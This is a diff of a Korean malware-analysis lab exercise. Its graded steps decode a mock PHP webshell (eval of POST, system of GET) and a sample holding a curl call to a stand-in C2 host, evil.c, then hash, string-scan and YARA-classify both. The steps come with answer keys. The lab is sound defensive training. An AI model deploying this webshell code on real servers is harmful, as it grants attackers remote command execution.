@@ -22,19 +22,27 @@ steps:
 
   - order: 1
     instruction: |
-      ## 🎯 분석 도구 확인
-      **실습 의미:** 악성코드 분석은 분류(yara)·문자열(strings)·해시(sha256sum)·타입(file) 도구로 한다 — 먼저 분석가 도구가 갖춰졌는지 확인한다.
-      ## 💻 실행 명령 (한 줄씩 따라 실행)
+      ## STEP 1 — 악성코드 분석가 도구가 갖춰졌는지 확인
+      > **이 단계에서 할 일:** yara(분류)·strings(문자열)·sha256sum(해시)·file(타입) 도구 가용을 확인한다.
+      > **왜:** 악성코드 분석은 검체를 '실행하지 않고' 분류·문자열·해시·타입으로 식별하는 데서 시작한다.
+
+      ### ▷ 그대로 입력
       ```bash
       docker exec el34-attacker sh -c '
-        # yara 버전 출력 (분류 엔진 확인)
         yara --version
-        # strings·sha256sum·file이 모두 있으면 분석가 도구 준비 완료 마커
         command -v strings sha256sum file >/dev/null 2>&1 && echo analyst_ready
       '
       ```
-      ## ✅ 합격 기준
-      `analyst_ready` 출력 시 통과. **근거:** 마커는 yara·strings·sha256sum·file이 모두 존재할 때만 찍히므로, 정적·분류 분석 도구가 준비됐음을 뜻한다.
+
+      ### ▷ 이렇게 나오면 정상 (실측 예)
+      ```
+      4.1.3
+      analyst_ready
+      ```
+
+      ### ▷ 결과 해석
+      yara 버전 + analyst_ready가 보이면 분류·정적 분석 도구가 준비된 것. (참고: el34-attacker에는 `file`
+      명령이 없을 수 있다 — 그 경우 STEP 3에서 타입은 못 보고 해시·strings로 식별한다. 핵심 식별자는 해시다.)
     hint: '도구 확인'
     category: survey
     points: 10
@@ -55,23 +63,30 @@ steps:
 
   - order: 2
     instruction: |
-      ## 🎯 검체 준비 (격리된 분석 디렉터리)
-      **실습 의미:** 검체는 격리 디렉터리에서만 다룬다 — 실습용 모의 웹셸을 base64로 안전히 생성한다(실행 금지, 분석 전용).
-      ## 💻 실행 명령 (한 줄씩 따라 실행)
+      ## STEP 2 — 검체를 '격리 디렉터리'에 안전하게 만든다
+      > **이 단계에서 할 일:** 격리 디렉터리(/tmp/mw09)를 만들고, 실습용 모의 웹셸 검체를 base64로
+      > 떨군다(절대 실행 금지, 분석 전용).
+      > **왜:** 검체는 운영망과 분리된 격리 공간에서만 다뤄야 실수로도 감염을 일으키지 않는다.
+
+      ### ▷ 그대로 입력
       ```bash
       docker exec el34-attacker sh -c '
-        # 격리 분석 디렉터리 생성
         mkdir -p /tmp/mw09
-        # 실습용 모의 웹셸 검체를 base64로 생성 (절대 실행하지 않고 분석만)
         echo "PD9waHAgQGV2YWwoJF9QT1NUWydjJ10pOyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgLy8gbWFsd2FyZQ==" | base64 -d > /tmp/mw09/sample.bin
-        # 검체 바이트 크기 출력
         wc -c < /tmp/mw09/sample.bin
-        # 검체 파일이 실제 생겼으면 준비 완료 마커
         [ -s /tmp/mw09/sample.bin ] && echo sample_staged
       '
       ```
-      ## ✅ 합격 기준
-      `sample_staged`(과 검체 크기)가 출력되면 통과. **근거:** 마커는 격리 디렉터리에 검체가 실제 생성됐을 때만 찍히므로, 안전한 분석 준비가 됐음을 뜻한다.
+
+      ### ▷ 이렇게 나오면 정상 (실측 예)
+      ```
+      58
+      sample_staged
+      ```
+
+      ### ▷ 결과 해석
+      58바이트짜리 검체가 격리 디렉터리에 생겼다(이 검체는 `@eval($_POST)`+`system($_GET)` 웹셸 코드 —
+      절대 실행하지 않는다). STEP 8 끝에 self-clean으로 삭제한다.
     hint: '검체 준비'
     category: manipulation
     points: 12
@@ -96,22 +111,30 @@ steps:
 
   - order: 3
     instruction: |
-      ## 🎯 정적 분석 ① — 해시·타입
-      **실습 의미:** 검체를 실행하지 않고 식별한다 — SHA-256(고유 지문, CTI 조회용)과 file 타입(무엇인가)으로 검체를 특정한다.
-      ## 💻 실행 명령 (한 줄씩 따라 실행)
+      ## STEP 3 — 정적 분석 ① 해시·타입으로 검체를 특정한다
+      > **이 단계에서 할 일:** SHA-256(고유 지문)과 file 타입으로 검체를 실행 없이 식별한다.
+      > **왜:** 해시는 검체의 지문이라 VirusTotal/OpenCTI 조회·IOC 공유에 쓰고, 타입은 '무엇인가'를 알려준다.
+
+      ### ▷ 그대로 입력
       ```bash
       docker exec el34-attacker sh -c '
         cd /tmp/mw09
-        # SHA-256 앞 16자 = 검체 고유 지문 (VirusTotal/OpenCTI 조회·IOC 공유용)
         sha256sum sample.bin | cut -c1-16
-        # file = 매직바이트로 파일 타입 추정
         file sample.bin
-        # 해시·타입을 식별했으면 마커
         [ -f sample.bin ] && echo static_id_done
       '
       ```
-      ## ✅ 합격 기준
-      `static_id_done`(과 해시·타입)이 출력되면 통과. **근거:** 마커는 검체에 해시·타입 식별을 실제 수행했을 때 찍히므로, 실행 없이 검체를 특정하는 정적 분석의 첫 단계가 완료됐음을 뜻한다.
+
+      ### ▷ 이렇게 나오면 정상 (실측 예 — 같은 검체면 해시는 항상 같음)
+      ```
+      f8483772480bb2b8
+      static_id_done
+      ```
+
+      ### ▷ 결과 해석
+      앞 16자 해시(f8483772480bb2b8)가 이 검체의 지문이다. (참고: el34-attacker에 `file`이 없으면
+      `file: not found` 에러만 나고 타입은 안 보인다 — 그때는 해시+strings로 식별한다.) 같은 입력이면
+      해시는 항상 같다 → 다른 곳에서 같은 해시가 나오면 동일 검체.
     hint: '해시/타입'
     category: analysis
     points: 14
@@ -135,19 +158,27 @@ steps:
 
   - order: 4
     instruction: |
-      ## 🎯 정적 분석 ② — 문자열 추출
-      **실습 의미:** strings로 검체 속 사람이 읽을 수 있는 문자열을 뽑아 명령·함수명 등 행위 단서를 얻는다 — 문자열은 가장 빠른 행위 단서다.
-      ## 💻 실행 명령 (한 줄씩 따라 실행)
+      ## STEP 4 — 정적 분석 ② 문자열로 행위 단서를 뽑는다
+      > **이 단계에서 할 일:** strings로 검체 속 의심 키워드(eval/system/php/cmd)를 뽑는다.
+      > **왜:** 문자열은 가장 빠른 행위 단서다. eval()/system()이 보이면 원격 코드 실행 웹셸 의심.
+
+      ### ▷ 그대로 입력
       ```bash
       docker exec el34-attacker sh -c '
-        # 검체에서 의심 키워드(eval/system/php/cmd) 문자열을 추출해 본다
         strings /tmp/mw09/sample.bin | grep -iE "eval|system|php|cmd" | head
-        # 의심 키워드가 실제로 나오면 마커 (eval()/system()=원격 코드 실행 웹셸 의심)
         strings /tmp/mw09/sample.bin | grep -qiE "eval|system|php|cmd" && echo strings_done
       '
       ```
-      ## ✅ 합격 기준
-      `strings_done`(과 키워드)이 출력되면 통과. **근거:** 마커는 검체에서 의심 키워드가 실제 추출될 때만 찍히므로, 원격 코드 실행 웹셸의 행위 단서를 확보했음을 뜻한다.
+
+      ### ▷ 이렇게 나오면 정상 (실측 예)
+      ```
+      <?php @eval($_POST['c']); system($_GET['cmd']); // malware
+      strings_done
+      ```
+
+      ### ▷ 결과 해석
+      `@eval($_POST...)`와 `system($_GET...)`가 보인다 = 외부 입력을 코드/명령으로 실행하는 전형적
+      PHP 웹셸. 이 키워드들이 곧 STEP 5의 YARA 분류 룰이 잡을 시그니처다.
     hint: 'strings'
     category: analysis
     points: 14
@@ -168,30 +199,39 @@ steps:
 
   - order: 5
     instruction: |
-      ## 🎯 YARA 다중 룰 분류
-      **실습 의미:** 여러 YARA 룰로 검체를 스캔하면 매치된 룰명이 곧 분류 결과가 된다(W04는 진탐, 여기선 패밀리 분류 관점).
-      ## 💻 실행 명령 (한 줄씩 따라 실행)
+      ## STEP 5 — YARA 다중 룰로 검체를 '분류'한다
+      > **이 단계에서 할 일:** eval($_POST 또는 system($_GET를 잡는 YARA 룰로 검체를 스캔해, 매치된
+      > 룰명(=분류 결과)을 본다.
+      > **왜:** W04는 '탐지(진탐/오탐)' 관점이었다면, 여기선 매치된 룰명이 곧 '이 검체는 어느 패밀리인가'의
+      > 분류 결과가 된다.
+
+      ### ▷ 그대로 입력
       ```bash
       docker exec el34-attacker sh -c '
-        # 분류용 YARA 룰 생성 (eval($_POST 또는 system($_GET 포함 → webshell_php로 분류)
-        printf "cnVsZSB3ZWJzaGVsbF9waHAgeyBzdHJpbmdzOiAkYSA9IFwiZXZhbCgkX1BPU1RcIiAkYiA9IFwic3lzdGVtKCRfR0VUXCIgY29uZGl0aW9uOiAkYSBvciAkYiB9" | base64 -d > /tmp/mw09/r.yar
-        # 룰로 검체를 스캔 → 매치된 룰명(webshell_php)이 분류 결과로 출력됨
+        printf "cnVsZSB3ZWJzaGVsbF9waHAgeyBzdHJpbmdzOiAkYSA9ICJldmFsKCRfUE9TVCIgJGIgPSAic3lzdGVtKCRfR0VUIiBjb25kaXRpb246ICRhIG9yICRiIH0=" | base64 -d > /tmp/mw09/r.yar
         yara /tmp/mw09/r.yar /tmp/mw09/sample.bin
       '
       ```
-      ## ✅ 합격 기준
-      `webshell_php`(룰 매치)가 출력되면 통과. **근거:** 매치된 룰명이 출력됐다는 건 검체가 그 패밀리로 실제 분류됐다는 뜻이다.
+
+      ### ▷ 이렇게 나오면 정상 (실측 예)
+      ```
+      webshell_php /tmp/mw09/sample.bin
+      ```
+
+      ### ▷ 결과 해석
+      `webshell_php <검체경로>` = 검체가 webshell_php 패밀리로 분류됐다는 뜻(룰의 $a 또는 $b 시그니처가
+      매치). 룰을 여러 패밀리(webshell/ransomware/cobaltstrike…)로 모으면, 매치되는 룰명이 곧 검체의 분류표다.
     hint: 'YARA 분류'
     category: analysis
     points: 14
     answer: |
       docker exec el34-attacker sh -c '
-        # 분류용 YARA 룰 생성
-        printf "cnVsZSB3ZWJzaGVsbF9waHAgeyBzdHJpbmdzOiAkYSA9IFwiZXZhbCgkX1BPU1RcIiAkYiA9IFwic3lzdGVtKCRfR0VUXCIgY29uZGl0aW9uOiAkYSBvciAkYiB9" | base64 -d > /tmp/mw09/r.yar
+        # 분류용 YARA 룰 생성 (eval($_POST 또는 system($_GET → webshell_php 분류)
+        printf "cnVsZSB3ZWJzaGVsbF9waHAgeyBzdHJpbmdzOiAkYSA9ICJldmFsKCRfUE9TVCIgJGIgPSAic3lzdGVtKCRfR0VUIiBjb25kaXRpb246ICRhIG9yICRiIH0=" | base64 -d > /tmp/mw09/r.yar
         # 룰로 검체 스캔 → 매치 룰명이 분류 결과
         yara /tmp/mw09/r.yar /tmp/mw09/sample.bin
       '
-    answer_detail: "YARA 분류 = 룰 매치로 패밀리 식별. 매치된 룰명이 분류 결과. W04 진탐을 분류로 확장."
+    answer_detail: "YARA 분류 = 룰 매치로 패밀리 식별. 매치된 룰명이 분류 결과. W04 진탐을 분류로 확장. (구 base64 룰은 \\\" 리터럴로 syntax error라 정상 룰로 교정.)"
     verify:
       type: output_contains
       expect: 'webshell_php'
@@ -201,22 +241,32 @@ steps:
 
   - order: 6
     instruction: |
-      ## 🎯 행위 지표 추출 (동적 분석 단서)
-      **실습 의미:** 동적 분석은 격리 샌드박스에서 실행해 행위를 관찰하지만, 그 전에 strings로 코드실행·네트워크 함수 같은 행위 지표를 미리 뽑아낸다.
-      ## 💻 실행 명령 (한 줄씩 따라 실행)
+      ## STEP 6 — 행위 지표(동적 단서)를 미리 뽑는다
+      > **이 단계에서 할 일:** 네트워크 행위가 든 모의 검체를 만들어, strings로 코드실행·네트워크 함수
+      > 지표를 추출한 뒤 정리한다.
+      > **왜:** 동적 분석은 격리 샌드박스에서 실행해 행위를 관찰하지만, 그 전에 정적으로 system()·curl
+      > 같은 행위 지표를 미리 뽑아 무엇을 관찰할지 정한다.
+
+      ### ▷ 그대로 입력
       ```bash
       docker exec el34-attacker sh -c '
-        # 네트워크 행위가 있는 모의 검체 생성 (system()+curl http)
         echo PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyBjdXJsIGh0dHA6Ly9ldmlsLmM= | base64 -d > /tmp/dyn09
-        # strings로 행위 지표(코드실행·네트워크 함수)를 추출해 본다
         strings /tmp/dyn09 | grep -iE "system|exec|curl|http" | head
-        # 코드실행·네트워크 지표가 실제 나오면 마커 (동적 시 파일/프로세스/C2 관찰) + 정리
         strings /tmp/dyn09 | grep -qiE "system|exec|curl" && echo "코드실행·네트워크 행위 지표 발견(동적 시 파일/프로세스/C2 관찰)" && echo behavior_analyzed
         rm -f /tmp/dyn09
       '
       ```
-      ## ✅ 합격 기준
-      `behavior_analyzed` 출력 시 통과. **근거:** 마커는 검체에서 코드실행·네트워크 행위 지표가 실제 추출될 때만 찍히므로, 정적 단계에서 동적 행위 단서를 확보했음을 뜻한다.
+
+      ### ▷ 이렇게 나오면 정상 (실측 예)
+      ```
+      <?php system($_GET["c"]); curl http://evil.c
+      코드실행·네트워크 행위 지표 발견(동적 시 파일/프로세스/C2 관찰)
+      behavior_analyzed
+      ```
+
+      ### ▷ 결과 해석
+      system()=코드 실행, curl http://...=외부 C2 통신 지표. 동적 분석 때는 이 지표를 단서로 샌드박스에서
+      '실제로 어떤 파일을 만들고 어디로 접속하나'를 관찰한다. (모의 검체는 바로 self-clean.)
     hint: '동적 분석'
     category: analysis
     points: 12
@@ -240,19 +290,26 @@ steps:
 
   - order: 7
     instruction: |
-      ## 🎯 안전한 검체 취급 + 정리
-      **실습 의미:** 검체는 절대 운영망에서 실행하지 않고 분석 후 격리 삭제한다 — 실수로도 운영 감염을 일으키지 않기 위함이다(self-clean).
-      ## 💻 실행 명령 (한 줄씩 따라 실행)
+      ## STEP 7 — 검체를 안전하게 정리한다 (self-clean)
+      > **이 단계에서 할 일:** 분석이 끝난 검체 디렉터리를 격리 삭제한다.
+      > **왜:** 검체는 운영망에서 절대 실행하지 않고, 분석 후 반드시 삭제해야 실수로도 감염을 옮기지 않는다.
+
+      ### ▷ 그대로 입력
       ```bash
       docker exec el34-attacker sh -c '
-        # 분석이 끝난 검체 디렉터리를 격리 삭제 (운영망 유입 방지)
         rm -rf /tmp/mw09
-        # 검체 디렉터리가 실제로 사라졌으면 안전 취급 완료 마커
         [ ! -d /tmp/mw09 ] && echo handling_done
       '
       ```
-      ## ✅ 합격 기준
-      `handling_done` 출력 시 통과. **근거:** 마커는 검체 디렉터리가 실제 삭제됐을 때만 찍히므로, 분석 종료 후 안전한 정리(self-clean)가 됐음을 뜻한다.
+
+      ### ▷ 이렇게 나오면 정상 (실측 예)
+      ```
+      handling_done
+      ```
+
+      ### ▷ 결과 해석
+      검체 디렉터리가 사라지면 안전 취급 완료. 안전 취급의 4원칙: ① 격리망에서만 ② 실행 금지 ③ 암호화
+      보관(zip+패스워드 'infected') ④ 해시만 공유. 본 실습은 분석 후 self-clean으로 흔적을 남기지 않는다.
     hint: '안전 취급'
     category: report
     points: 12
@@ -273,24 +330,32 @@ steps:
 
   - order: 8
     instruction: |
-      ## 🎯 악성코드 분석 보고서 작성
-      **실습 의미:** 앞 단계의 실측(해시·strings 키워드 수)을 인용한 보고서로 정리한다 — 추측이 아닌 분석 결과를 근거로 검체 정체를 보고한다.
-      ## 💻 실행 명령 (한 줄씩 따라 실행)
+      ## STEP 8 — 악성코드 분석 결과를 보고서로 남긴다
+      > **이 단계에서 할 일:** 검체를 다시 만들어 해시·의심 키워드 수를 실측하고, 그 값을 인용한 보고서
+      > 골격을 출력한 뒤 정리한다.
+      > **왜:** 검체의 정체는 추측이 아니라 해시·시그니처·분류 결과로 보고해야 신뢰받고 공유 가능하다.
+
+      ### ▷ 그대로 입력
       ```bash
       docker exec el34-attacker sh -c '
-        # 보고서 근거: 검체 샘플을 다시 만들어 해시·strings 키워드 수를 실측
         echo PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyA/Pgo= | base64 -d > /tmp/rep09
         H=$(sha256sum /tmp/rep09 | cut -c1-16)
         S=$(strings /tmp/rep09 | grep -ciE "system|eval")
-        # 실측 해시·키워드 수를 인용한 보고서 출력 (본문 상세는 학생이 보강)
         echo "# W09 악성코드 분석 보고서 — SHA256 ${H}·의심키워드 ${S}건·YARA(webshell_php)분류·안전취급/IOC환류"
-        # 실측 인용 보고서면 완료 마커 + 정리
         [ -n "$H" ] && echo malware_report_done
         rm -f /tmp/rep09
       '
       ```
-      ## ✅ 합격 기준
-      `malware_report_done` 출력 시 통과. **근거:** 마커는 실측 해시·strings 키워드 수를 인용한 보고서가 생성될 때만 찍히므로, 증거 기반 보고가 작성됐음을 뜻한다.
+
+      ### ▷ 이렇게 나오면 정상 (실측 예 — 해시는 검체에 따라 다름)
+      ```
+      # W09 악성코드 분석 보고서 — SHA256 ec409e094c956faf·의심키워드 1건·YARA(webshell_php)분류·안전취급/IOC환류
+      malware_report_done
+      ```
+
+      ### ▷ 결과 해석
+      보고서 골격이다. 제출용은 STEP 3~6의 구체값(검체 해시, 타입, strings 키워드, YARA 분류명, 행위
+      지표)과 IOC(해시·C2 도메인)를 본문으로 채워, CTI(W05)로 환류한다.
     hint: '정적+분류+안전'
     category: report
     points: 12
